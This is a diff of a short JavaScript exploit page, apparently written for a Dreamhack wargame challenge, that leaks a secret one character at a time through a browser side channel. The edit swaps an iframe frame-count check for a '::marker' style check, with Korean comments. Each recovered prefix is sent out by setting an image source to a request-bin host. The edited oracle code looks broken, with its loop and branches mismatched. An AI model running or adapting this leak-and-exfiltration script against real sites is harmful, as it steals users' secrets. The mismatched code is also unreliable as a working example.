@@ -3,10 +3,10 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => {
-                if (iframe.contentWindow.frames.length != 0)
+            const listItems = document.querySelectorAll('li'); // 리스트 아이템들을 선택
+            for (const listItem of listItems) {
+                const markerStyle = window.getComputedStyle(listItem, '::marker'); // ::marker 스타일 가져오기
+            if (markerStyle.content !== '')
                     return resolve();
                 else
                     return reject();
@@ -33,7 +33,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://lezikjw.request.dreamhack.games/${secret}`;
+                    img.src = `https://rzmbsfx.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
@@ -42,4 +42,3 @@
     
     exploit();
 </script>
-
